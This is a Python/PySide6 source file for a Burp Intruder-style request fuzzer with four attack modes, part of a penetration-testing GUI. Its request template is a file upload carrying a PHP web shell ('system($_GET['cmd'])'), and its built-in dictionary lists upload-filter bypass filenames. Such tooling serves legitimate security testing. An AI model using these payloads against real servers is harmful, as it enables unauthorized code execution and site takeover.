#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Intruder模块 - Burp风格的爆破功能
支持标记payload位置，多种攻击模式
"""

import re
import httpx
import asyncio
from typing import List, Dict, Tuple
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QTextEdit, QLineEdit,
    QPushButton, QComboBox, QLabel, QTableWidget, QTableWidgetItem,
    QHeaderView, QSplitter, QGroupBox, QProgressBar, QSpinBox,
    QCheckBox, QTabWidget, QFileDialog, QMessageBox, QPlainTextEdit,
    QApplication, QFrame, QSizePolicy, QProxyStyle, QStyle
)
from PySide6.QtCore import Qt, Signal, QThread
from PySide6.QtGui import QColor, QFont, QTextCursor

from .themes.dark_theme import COLORS
from .syntax_highlighter import HTTPHighlighter


class _NoFocusStyle(QProxyStyle):
    def drawPrimitive(self, element, option, painter, widget=None):
        if element == QStyle.PE_FrameFocusRect:
            return
        super().drawPrimitive(element, option, painter, widget)


class IntruderWorker(QThread):
    """Intruder异步工作线程"""
    
    result_ready = Signal(dict)
    progress_update = Signal(int, int)
    finished_signal = Signal()
    error_signal = Signal(str)
    
    def __init__(self, base_request: dict, payloads: List[List[str]], 
                 attack_mode: str = "sniper", threads: int = 10):
        super().__init__()
        self.base_request = base_request
        self.payloads = payloads
        self.attack_mode = attack_mode
        self.threads = threads
        self._is_running = True
        self._loop = None
    
    def stop(self):
        self._is_running = False
        if self._loop and self._loop.is_running():
            self._loop.stop()
        self.wait(1000)
    
    def run(self):
        import sys
        try:
            self._loop = asyncio.new_event_loop()
            
            # Linux 环境使用 Selector
            if sys.platform.startswith('linux'):
                self._loop = asyncio.SelectorEventLoop()
            
            asyncio.set_event_loop(self._loop)
            self._loop.run_until_complete(self._attack())
        except Exception as e:
            self.error_signal.emit(str(e))
        finally:
            if self._loop and not self._loop.is_closed():
                try:
                    self._loop.close()
                except Exception:
                    pass
    
    async def _attack(self):
        url = self.base_request.get('url', '')
        method = self.base_request.get('method', 'GET')
        headers = self.base_request.get('headers', {})
        body = self.base_request.get('body', '')
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        headers.pop('Content-Length', None)
        headers.pop('content-length', None)
        
        positions = self._get_payload_positions(url, headers, body)
        
        if not positions:
            self.error_signal.emit("未找到payload位置，请使用 $ $ 标记")
            return
        
        requests = self._generate_requests(url, headers, body, positions)
        total = len(requests)
        
        if total == 0:
            self.error_signal.emit("没有生成任何请求")
            return
        
        semaphore = asyncio.Semaphore(self.threads)
        completed = [0]
        lock = asyncio.Lock()
        
        async def send_request_with_limit(idx, req_data):
            async with semaphore:
                if not self._is_running:
                    return
                result = await self._send_single_request(method, req_data)
                result['index'] = idx
                result['payload'] = req_data.get('payload_info', '')
                self.result_ready.emit(result)
                async with lock:
                    completed[0] += 1
                    current = completed[0]
                self.progress_update.emit(current, total)
        
        tasks = [send_request_with_limit(i, req) for i, req in enumerate(requests)]
        await asyncio.gather(*tasks)
        self.finished_signal.emit()
    
    def _get_payload_positions(self, url: str, headers: dict, body: str) -> List[Tuple[str, int, int]]:
        positions = []
        marker = '$'
        
        idx = 0
        while True:
            start = url.find(marker, idx)
            if start == -1:
                break
            end = url.find(marker, start + 1)
            if end == -1:
                break
            positions.append(('url', start, end + 1))
            idx = end + 1
        
        idx = 0
        while True:
            start = body.find(marker, idx)
            if start == -1:
                break
            end = body.find(marker, start + 1)
            if end == -1:
                break
            positions.append(('body', start, end + 1))
            idx = end + 1
        
        return positions
    
    def _generate_requests(self, url: str, headers: dict, body: str, 
                          positions: List[Tuple[str, int, int]]) -> List[dict]:
        requests = []
        
        if self.attack_mode == "sniper":
            for pos_idx, (pos_type, start, end) in enumerate(positions):
                for payload_list in self.payloads:
                    for payload in payload_list:
                        req = self._create_request(url, headers, body, positions, pos_idx, payload)
                        req['payload_info'] = f"位置{pos_idx+1}: {payload[:50]}"
                        requests.append(req)
        
        elif self.attack_mode == "battering_ram":
            for payload_list in self.payloads:
                for payload in payload_list:
                    req = self._create_request_all_positions(url, headers, body, positions, payload)
                    req['payload_info'] = f"全部: {payload[:50]}"
                    requests.append(req)
        
        elif self.attack_mode == "pitchfork":
            min_len = min(len(pl) for pl in self.payloads) if self.payloads else 0
            for i in range(min_len):
                payloads = [pl[i] for pl in self.payloads]
                req = self._create_request_pitchfork(url, headers, body, positions, payloads)
                req['payload_info'] = f"组合: {' | '.join(p[:30] for p in payloads)}"
                requests.append(req)
        
        elif self.attack_mode == "cluster_bomb":
            from itertools import product
            for combo in product(*self.payloads):
                for pos_idx, (pos_type, start, end) in enumerate(positions):
                    if pos_idx < len(combo):
                        req = self._create_request(url, headers, body, positions, pos_idx, combo[pos_idx])
                        req['payload_info'] = f"组合: {' | '.join(c[:20] for c in combo)}"
                        requests.append(req)
        
        return requests
    
    def _create_request(self, url: str, headers: dict, body: str,
                       positions: List[Tuple[str, int, int]], 
                       target_idx: int, payload: str) -> dict:
        new_url = url
        new_body = body
        
        pos_type, start, end = positions[target_idx]
        
        if pos_type == 'url':
            new_url = url[:start] + payload + url[end:]
            for i, (pt, s, e) in enumerate(positions):
                if i != target_idx and pt == 'url':
                    new_url = new_url.replace('$', '')
        else:
            new_body = body[:start] + payload + body[end:]
            for i, (pt, s, e) in enumerate(positions):
                if i != target_idx and pt == 'body':
                    new_body = new_body.replace('$', '')
        
        new_url = new_url.replace('$', '')
        new_body = new_body.replace('$', '')
        
        return {'url': new_url, 'headers': headers, 'body': new_body}
    
    def _create_request_all_positions(self, url: str, headers: dict, body: str,
                                      positions: List[Tuple[str, int, int]], 
                                      payload: str) -> dict:
        new_url = url
        new_body = body
        
        for pos_type, start, end in sorted(positions, reverse=True):
            if pos_type == 'url':
                new_url = new_url[:start] + payload + new_url[end:]
            else:
                new_body = new_body[:start] + payload + new_body[end:]
        
        new_url = new_url.replace('$', '')
        new_body = new_body.replace('$', '')
        
        return {'url': new_url, 'headers': headers, 'body': new_body}
    
    def _create_request_pitchfork(self, url: str, headers: dict, body: str,
                                  positions: List[Tuple[str, int, int]], 
                                  payloads: List[str]) -> dict:
        new_url = url
        new_body = body
        
        for i, (pos_type, start, end) in enumerate(positions):
            if i < len(payloads):
                if pos_type == 'url':
                    new_url = new_url[:start] + payloads[i] + new_url[end:]
                else:
                    new_body = new_body[:start] + payloads[i] + new_body[end:]
        
        new_url = new_url.replace('$', '')
        new_body = new_body.replace('$', '')
        
        return {'url': new_url, 'headers': headers, 'body': new_body}
    
    async def _send_single_request(self, method: str, req_data: dict) -> dict:
        url = req_data['url']
        headers = req_data['headers']
        body = req_data['body']
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=30, follow_redirects=True) as client:
                request_kwargs = {'headers': headers}
                if body:
                    if isinstance(body, str):
                        request_kwargs['content'] = body.encode('utf-8')
                    else:
                        request_kwargs['content'] = body
                
                if method == 'GET':
                    response = await client.get(url, **request_kwargs)
                elif method == 'POST':
                    response = await client.post(url, **request_kwargs)
                elif method == 'PUT':
                    response = await client.put(url, **request_kwargs)
                elif method == 'DELETE':
                    response = await client.delete(url, **request_kwargs)
                elif method == 'PATCH':
                    response = await client.patch(url, **request_kwargs)
                else:
                    response = await client.request(method, url, **request_kwargs)
                
                return {
                    'status_code': response.status_code,
                    'length': len(response.content),
                    'body': response.text,
                    'error': ''
                }
        except Exception as e:
            return {'status_code': 0, 'length': 0, 'body': '', 'error': str(e)}


class IntruderWidget(QWidget):
    """Intruder主界面"""
    
    def __init__(self):
        super().__init__()
        self.worker = None
        self.payload_sets = [[]]
        self.current_mode = "sniper"
        self.init_ui()
    
    def init_ui(self):
        # 主布局
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)
        
        # 顶部控制栏
        top_layout = QHBoxLayout()
        top_layout.setSpacing(10)
        
        top_layout.addWidget(QLabel("攻击模式:"))
        self.attack_mode = QComboBox()
        # 汉化攻击模式
        self.attack_mode.addItems([
            "Sniper (狙击手 - 单点爆破)",
            "Battering Ram (攻城锤 - 全部替换)",
            "Pitchfork (草叉 - 一一对应)",
            "Cluster Bomb (集束炸弹 - 笛卡尔积)"
        ])
        self.attack_mode.currentIndexChanged.connect(self._on_mode_changed)
        self.attack_mode.setMinimumWidth(280)
        top_layout.addWidget(self.attack_mode)
        
        top_layout.addWidget(QLabel("线程:"))
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 100)
        self.thread_spin.setValue(10)
        self.thread_spin.setFixedWidth(70)
        top_layout.addWidget(self.thread_spin)
        
        top_layout.addStretch()
        
        self.mark_btn = QPushButton("标记 $")
        self.mark_btn.setFixedWidth(80)
        self.mark_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['accent']};
                color: white;
                border: none;
                padding: 5px 10px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {COLORS['accent_hover']};
            }}
        """)
        self.mark_btn.clicked.connect(self._mark_position)
        top_layout.addWidget(self.mark_btn)
        
        self.clear_mark_btn = QPushButton("清除 $")
        self.clear_mark_btn.setFixedWidth(80)
        self.clear_mark_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                padding: 5px 10px;
                border-radius: 4px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        self.clear_mark_btn.clicked.connect(self._clear_marks)
        top_layout.addWidget(self.clear_mark_btn)
        
        main_layout.addLayout(top_layout)
        
        # 主分割器 - 水平分割左右面板
        main_splitter = QSplitter(Qt.Horizontal)
        main_splitter.setHandleWidth(8)
        main_splitter.setStyleSheet(f"""
            QSplitter::handle {{
                background-color: {COLORS['border']};
            }}
            QSplitter::handle:hover {{
                background-color: {COLORS['accent']};
            }}
        """)
        
        # 左侧面板 - 请求和Payload
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)
        left_layout.setSpacing(10)
        
        # 请求编辑区域
        req_group = QGroupBox("请求模板 ($标记位置)")
        req_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        req_layout = QVBoxLayout(req_group)
        req_layout.setContentsMargins(8, 8, 8, 8)
        
        self.req_edit = QPlainTextEdit()
        self.req_edit.setFont(QFont("Consolas", 10))
        self.req_edit.setPlaceholderText(
            "POST /upload.php HTTP/1.1\n"
            "Host: example.com\n"
            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n"
            "------WebKitFormBoundary\n"
            'Content-Disposition: form-data; name=\"file\"; filename=\"$shell.php$\"\n\n'
            "<?php system($_GET['cmd']); ?>"
        )
        self.req_edit.setMinimumHeight(200)
        self.highlighter_req = HTTPHighlighter(self.req_edit.document(), is_request=True)
        req_layout.addWidget(self.req_edit)
        
        left_layout.addWidget(req_group, 2)
        
        # Payload配置区域
        payload_group = QGroupBox("Payload 配置")
        payload_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        payload_layout = QVBoxLayout(payload_group)
        payload_layout.setContentsMargins(8, 8, 8, 8)
        payload_layout.setSpacing(8)
        
        # Payload控制栏 - 修复按钮显示不全问题
        payload_control = QHBoxLayout()
        payload_control.setSpacing(8)
        
        payload_control.addWidget(QLabel("集合:"))
        self.payload_set_combo = QComboBox()
        self.payload_set_combo.addItem("1")
        self.payload_set_combo.currentIndexChanged.connect(self._on_payload_set_changed)
        self.payload_set_combo.setFixedWidth(60)
        payload_control.addWidget(self.payload_set_combo)
        
        # + 按钮 - 【修复】增大宽度确保文字显示完整
        add_set_btn = QPushButton("添加")
        add_set_btn.setFixedWidth(70)
        add_set_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['success']};
                color: white;
                border: none;
                border-radius: 4px;
                font-weight: bold;
                padding: 5px 10px;
            }}
            QPushButton:hover {{
                background-color: #059669;
            }}
        """)
        add_set_btn.setToolTip("添加新Payload集合")
        add_set_btn.clicked.connect(self._add_payload_set)
        payload_control.addWidget(add_set_btn)
        
        # 【修复】增加按钮宽度和间距，确保文字显示完整
        load_file_btn = QPushButton("从文件加载")
        load_file_btn.setMinimumWidth(120)
        load_file_btn.setMaximumWidth(150)
        load_file_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                border-radius: 4px;
                padding: 5px 12px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        load_file_btn.clicked.connect(self._load_payload_file)
        payload_control.addWidget(load_file_btn)
        
        load_dict_btn = QPushButton("加载字典")
        load_dict_btn.setMinimumWidth(100)
        load_dict_btn.setMaximumWidth(120)
        load_dict_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                border-radius: 4px;
                padding: 5px 12px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        load_dict_btn.clicked.connect(self._load_bypass_dict)
        payload_control.addWidget(load_dict_btn)
        
        clear_btn = QPushButton("清空")
        clear_btn.setMinimumWidth(70)
        clear_btn.setMaximumWidth(90)
        clear_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['danger']};
                color: white;
                border: none;
                border-radius: 4px;
                padding: 5px 12px;
            }}
            QPushButton:hover {{
                background-color: #dc2626;
            }}
        """)
        clear_btn.clicked.connect(self._clear_payloads)
        payload_control.addWidget(clear_btn)
        
        # 添加弹簧，将按钮推向左侧
        payload_control.addStretch()
        
        payload_layout.addLayout(payload_control)
        
        # Payload输入框
        self.payload_input = QPlainTextEdit()
        self.payload_input.setFont(QFont("Consolas", 10))
        self.payload_input.setPlaceholderText("每行一个payload...")
        self.payload_input.setMinimumHeight(120)
        payload_layout.addWidget(self.payload_input)
        
        left_layout.addWidget(payload_group, 1)
        
        main_splitter.addWidget(left_panel)
        
        # 右侧面板 - 攻击控制和结果
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(10)
        
        # 攻击控制栏
        attack_control = QHBoxLayout()
        attack_control.setSpacing(10)
        
        self.start_btn = QPushButton("开始攻击")
        self.start_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['danger']};
                color: white;
                border: none;
                padding: 8px 20px;
                border-radius: 4px;
                font-weight: bold;
                font-size: 13px;
            }}
            QPushButton:hover {{
                background-color: #dc2626;
            }}
            QPushButton:disabled {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_secondary']};
            }}
        """)
        self.start_btn.clicked.connect(self._start_attack)
        attack_control.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("停止")
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['warning']};
                color: white;
                border: none;
                padding: 8px 20px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: #d97706;
            }}
            QPushButton:disabled {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_secondary']};
            }}
        """)
        self.stop_btn.clicked.connect(self._stop_attack)
        attack_control.addWidget(self.stop_btn)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setMaximumHeight(25)
        self.progress_bar.setStyleSheet(f"""
            QProgressBar {{
                border: none;
                background-color: {COLORS['bg_tertiary']};
                border-radius: 4px;
                text-align: center;
                color: {COLORS['text_primary']};
            }}
            QProgressBar::chunk {{
                background-color: {COLORS['accent']};
                border-radius: 4px;
            }}
        """)
        attack_control.addWidget(self.progress_bar, 1)
        
        self.status_label = QLabel("就绪")
        self.status_label.setStyleSheet(f"color: {COLORS['text_secondary']};")
        attack_control.addWidget(self.status_label)
        
        right_layout.addLayout(attack_control)
        
        # 【关键修复】使用垂直分割器分割攻击结果表格和详情区域
        results_detail_splitter = QSplitter(Qt.Vertical)
        results_detail_splitter.setHandleWidth(8)
        results_detail_splitter.setStyleSheet(f"""
            QSplitter::handle {{
                background-color: {COLORS['border']};
            }}
            QSplitter::handle:hover {{
                background-color: {COLORS['accent']};
            }}
        """)
        
        # 结果表格
        results_group = QGroupBox("攻击结果")
        results_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        results_layout = QVBoxLayout(results_group)
        results_layout.setContentsMargins(8, 8, 8, 8)
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(5)
        self.results_table.setHorizontalHeaderLabels(["#", "Payload", "状态码", "长度", "错误"])
        self.results_table.setColumnWidth(0, 50)
        self.results_table.setColumnWidth(2, 70)
        self.results_table.setColumnWidth(3, 70)
        self.results_table.setColumnWidth(4, 100)
        
        header = self.results_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Fixed)
        header.setSectionResizeMode(1, QHeaderView.Stretch)
        header.setSectionResizeMode(2, QHeaderView.Fixed)
        header.setSectionResizeMode(3, QHeaderView.Fixed)
        header.setSectionResizeMode(4, QHeaderView.Fixed)
        
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.results_table.setStyle(_NoFocusStyle(self.results_table.style()))
        self.results_table.itemClicked.connect(self._show_result_detail)
        self.results_table.setStyleSheet(f"""
            QTableWidget {{
                background-color: {COLORS['bg_secondary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                gridline-color: {COLORS['border']};
            }}
            QTableWidget::item:focus {{
                outline: 0px;
            }}
            QTableWidget::item:selected {{
                background-color: {COLORS['accent']};
                color: white;
                border: none;
            }}
            QHeaderView::section {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                padding: 8px;
                border: none;
                border-right: 1px solid {COLORS['border']};
                font-weight: bold;
            }}
        """)
        results_layout.addWidget(self.results_table)
        results_detail_splitter.addWidget(results_group)
        
        # 结果详情区域
        detail_group = QGroupBox("响应详情")
        detail_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        detail_layout = QVBoxLayout(detail_group)
        detail_layout.setContentsMargins(8, 8, 8, 8)
        detail_layout.setSpacing(5)
        
        # 详情信息栏
        info_h_layout = QHBoxLayout()
        info_h_layout.setSpacing(15)
        
        self.detail_status = QLabel("")
        self.detail_status.setStyleSheet(f"color: {COLORS['text_primary']}; font-weight: bold;")
        info_h_layout.addWidget(self.detail_status)
        
        self.detail_length = QLabel("")
        self.detail_length.setStyleSheet(f"color: {COLORS['text_secondary']};")
        info_h_layout.addWidget(self.detail_length)
        
        self.detail_payload = QLabel("")
        self.detail_payload.setStyleSheet(f"color: {COLORS['accent']};")
        self.detail_payload.setWordWrap(True)
        info_h_layout.addWidget(self.detail_payload, 1)
        
        detail_layout.addLayout(info_h_layout)
        
        # 响应内容
        self.detail_text = QPlainTextEdit()
        self.detail_text.setReadOnly(True)
        self.detail_text.setFont(QFont("Consolas", 10))
        self.detail_text.setPlaceholderText("点击结果查看响应...")
        self.highlighter_detail = HTTPHighlighter(self.detail_text.document(), is_request=False)
        detail_layout.addWidget(self.detail_text)
        
        results_detail_splitter.addWidget(detail_group)
        
        # 【关键修复】设置攻击结果小一点，响应详情区域大一点
        results_detail_splitter.setStretchFactor(0, 1)
        results_detail_splitter.setStretchFactor(1, 3)
        results_detail_splitter.setSizes([150, 450])
        
        right_layout.addWidget(results_detail_splitter, 1)
        
        main_splitter.addWidget(right_panel)
        
        # 设置分割器初始大小
        main_splitter.setSizes([500, 700])
        
        main_layout.addWidget(main_splitter, 1)
    
    def _on_mode_changed(self, index):
        """攻击模式改变"""
        modes = ["sniper", "battering_ram", "pitchfork", "cluster_bomb"]
        if 0 <= index < len(modes):
            self.current_mode = modes[index]
            print(f"攻击模式已切换为: {self.current_mode}")
    
    def _mark_position(self):
        cursor = self.req_edit.textCursor()
        if cursor.hasSelection():
            selected = cursor.selectedText()
            cursor.insertText(f"${selected}$")
    
    def _clear_marks(self):
        text = self.req_edit.toPlainText()
        self.req_edit.setPlainText(text.replace('$', ''))
    
    def _add_payload_set(self):
        self.payload_sets.append([])
        self.payload_set_combo.addItem(str(len(self.payload_sets)))
        self.payload_set_combo.setCurrentIndex(len(self.payload_sets) - 1)
    
    def _on_payload_set_changed(self, index):
        if 0 <= index < len(self.payload_sets):
            self.payload_input.setPlainText('\n'.join(self.payload_sets[index]))
    
    def _clear_payloads(self):
        self.payload_input.clear()
        idx = self.payload_set_combo.currentIndex()
        if idx >= 0:
            self.payload_sets[idx] = []
    
    def _load_payload_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "选择Payload文件", "", "文本文件 (*.txt)")
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.payload_input.setPlainText('\n'.join(payloads))
                idx = self.payload_set_combo.currentIndex()
                if idx >= 0:
                    self.payload_sets[idx] = payloads
            except Exception as e:
                QMessageBox.critical(self, "错误", f"加载失败: {str(e)}")
    
    def _load_bypass_dict(self):
        bypass_payloads = [
            "shell.php", "shell.php.", "shell.php%00.jpg", "shell.php;.jpg",
            "shell.jpg.php", "shell.PHP", "shell.pHp", "shell.php5",
            "shell.pht", "shell.phtml", "shell.phps", "shell.php.jpg",
            "shell.php%00", "shell.php%0a", "shell.php%0d", "shell.php%20",
            "shell.php::$DATA", "shell.asp;.jpg", "shell.jsp%00.jpg",
        ]
        self.payload_input.setPlainText('\n'.join(bypass_payloads))
        idx = self.payload_set_combo.currentIndex()
        if idx >= 0:
            self.payload_sets[idx] = bypass_payloads
    
    def _parse_request(self, req_text: str):
        lines = req_text.strip().split('\n')
        if not lines:
            return None, None, None, None
        
        first_line = lines[0].strip()
        parts = first_line.split(' ')
        if len(parts) < 2:
            return None, None, None, None
        
        method = parts[0]
        url = parts[1]
        
        headers = {}
        body_start = 0
        for i, line in enumerate(lines[1:], 1):
            if line.strip() == '':
                body_start = i + 1
                break
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        
        body = '\n'.join(lines[body_start:]) if body_start > 0 else ''
        
        return method, url, headers, body
    
    def _start_attack(self):
        payloads_text = self.payload_input.toPlainText().strip()
        if not payloads_text:
            QMessageBox.warning(self, "警告", "请输入payload")
            return
        
        payloads = [p.strip() for p in payloads_text.split('\n') if p.strip()]
        if not payloads:
            QMessageBox.warning(self, "警告", "没有有效的payload")
            return
        
        idx = self.payload_set_combo.currentIndex()
        if idx >= 0:
            self.payload_sets[idx] = payloads
        
        req_text = self.req_edit.toPlainText()
        method, url, headers, body = self._parse_request(req_text)
        
        if not url:
            QMessageBox.warning(self, "警告", "请求格式不正确")
            return
        
        if '$' not in req_text:
            QMessageBox.warning(self, "警告", "请使用 $ $ 标记payload位置")
            return
        
        self.results_table.setRowCount(0)
        self.detail_text.clear()
        self.detail_status.setText("")
        self.detail_length.setText("")
        self.detail_payload.setText("")
        self.progress_bar.setMaximum(1)
        self.progress_bar.setValue(0)
        
        base_request = {'url': url, 'method': method, 'headers': headers, 'body': body}
        
        self.worker = IntruderWorker(
            base_request=base_request,
            payloads=[payloads],
            attack_mode=self.current_mode,
            threads=self.thread_spin.value()
        )
        
        self.worker.result_ready.connect(self._on_result)
        self.worker.progress_update.connect(self._on_progress)
        self.worker.finished_signal.connect(self._on_finished)
        self.worker.error_signal.connect(self._on_error)
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_label.setText("攻击中...")
        self.status_label.setStyleSheet(f"color: {COLORS['accent']}; font-weight: bold;")
        
        self.worker.start()
    
    def _stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.worker.wait()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("已停止")
        self.status_label.setStyleSheet(f"color: {COLORS['text_secondary']};")
    
    def _on_result(self, result: dict):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        self.results_table.setItem(row, 0, QTableWidgetItem(str(result['index'] + 1)))
        
        payload_item = QTableWidgetItem(result['payload'])
        payload_item.setToolTip(result['payload'])
        self.results_table.setItem(row, 1, payload_item)
        
        status_code = result['status_code']
        status_item = QTableWidgetItem(str(status_code))
        if 200 <= status_code < 300:
            status_item.setForeground(QColor(COLORS['success']))
        elif 300 <= status_code < 400:
            status_item.setForeground(QColor(COLORS['warning']))
        elif status_code >= 400:
            status_item.setForeground(QColor(COLORS['danger']))
        self.results_table.setItem(row, 2, status_item)
        
        self.results_table.setItem(row, 3, QTableWidgetItem(str(result['length'])))
        
        # 修复 TypeError: 'NoneType' object is not subscriptable
        error = result.get('error', '') or ''
        error_item = QTableWidgetItem(error[:30] if error else '')
        if error:
            error_item.setForeground(QColor(COLORS['danger']))
        self.results_table.setItem(row, 4, error_item)
        
        # 存储完整结果数据
        status_item.setData(Qt.UserRole, result)
        
        self.results_table.scrollToBottom()
    
    def _on_progress(self, current: int, total: int):
        self.progress_bar.setMaximum(total)
        self.progress_bar.setValue(current)
        self.status_label.setText(f"{current}/{total}")
    
    def _on_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setValue(self.progress_bar.maximum())
        self.status_label.setText("完成")
        self.status_label.setStyleSheet(f"color: {COLORS['success']}; font-weight: bold;")
    
    def _on_error(self, error_msg: str):
        QMessageBox.critical(self, "错误", error_msg)
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("错误")
        self.status_label.setStyleSheet(f"color: {COLORS['danger']};")
    
    def _show_result_detail(self, item):
        row = item.row()
        status_item = self.results_table.item(row, 2)
        if status_item:
            result = status_item.data(Qt.UserRole)
            if result:
                self.detail_status.setText(f"状态码: {result['status_code']}")
                self.detail_length.setText(f"长度: {result['length']} bytes")
                self.detail_payload.setText(f"Payload: {result['payload']}")
                self.detail_text.setPlainText(result.get('body', ''))
    
    def load_request(self, request_data: dict):
        if request_data:
            method = request_data.get('method', 'GET')
            url = request_data.get('url', '')
            headers = request_data.get('request_headers', '')
            body = request_data.get('request_body', '')
            
            req_text = f"{method} {url} HTTP/1.1\n"
            req_text += f"{headers}\n\n"
            req_text += body
            
            self.req_edit.setPlainText(req_text)
